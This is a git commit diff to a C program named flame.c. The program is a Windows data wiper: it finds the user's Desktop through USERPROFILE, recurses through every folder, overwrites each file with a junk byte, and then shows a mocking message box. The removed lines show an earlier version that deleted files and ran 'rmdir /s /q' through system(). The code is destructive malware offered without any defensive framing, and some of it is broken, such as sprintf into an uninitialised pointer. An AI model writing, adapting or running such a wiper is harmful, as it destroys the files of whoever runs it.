35889f719f318ad2758e8884efd51fe03de72f0a
Komodo <68278515+komodoooo@users.noreply.github.com>
2023-04-13 21:56:51 +0200

    Update flame.c

--- flame.c
+++ flame.c
@@ -3,11 +3,29 @@
 #include <windows.h>
 #include <dirent.h>
 #include <sys/stat.h>
-#define NIL NULL        //i need to do that.
+#include <string.h>
+#define SUS "\x90"
+#define SETCPOS \
+        SetCursorPos(INT_MAX,INT_MAX)
+    //0x7fffffff
 
-void flame(char * element){
-    SetCursorPos(10, 10);
-    remove(element);
+void fill(const char *element);
+int recognize_dir(char *filename);
+void flame(char *basepath);
+
+int main(int argc, char *argv[]){
+    char *sus;
+    wchar_t *sussybaka=_wgetenv(L"USERPROFILE");
+    sprintf(sus,"%ls\\Desktop",sussybaka);
+    flame(sus);
+    MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
+}
+
+void fill(const char *filename){
+    SETCPOS;
+    FILE *file=fopen(filename, "wb");
+    fwrite(SUS, 1, sizeof(SUS), file);
+    fclose(file);
 }
 
 int recognize_dir(char *file){
@@ -16,24 +34,24 @@ int recognize_dir(char *file){
     return S_ISREG(isdir.st_mode);
 }
 
-int main(){
+void flame(char *basepath){
     DIR *ls;
-    char *sus, *file, *deldir;
+    char *file, *deldir;
     struct dirent *dir;
-    wchar_t *sussybaka = _wgetenv(L"USERPROFILE");
-    sprintf(sus, "%ls\\Desktop", sussybaka);
-    chdir(sus);
-    ls = opendir(".");
+    chdir(basepath);
+    int a=0;
+    ls=opendir(".");
     if(ls){
-        while((dir = readdir(ls)) != NIL){
-            file = dir->d_name;
-            if(recognize_dir(file)==0){
-                SetCursorPos(10, 10);
-                sprintf(deldir, "rmdir /s /q %s", file);
-                system(deldir);
-            } else flame(file);
+        while((dir=readdir(ls))!=NULL){
+            file = dir->d_name;   
+            if(strcmp(file, ".")+strcmp(file,"..")==2&&recognize_dir(file)==0){
+                SETCPOS;
+                char dirpath[256];
+                sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
+                flame(dirpath); //i love recursionz
+                chdir("..");
+            } else fill(file);
         }
         closedir(ls);
     }
-    MessageBox(NIL, "BOZO!", __FILE__, 1);
 }
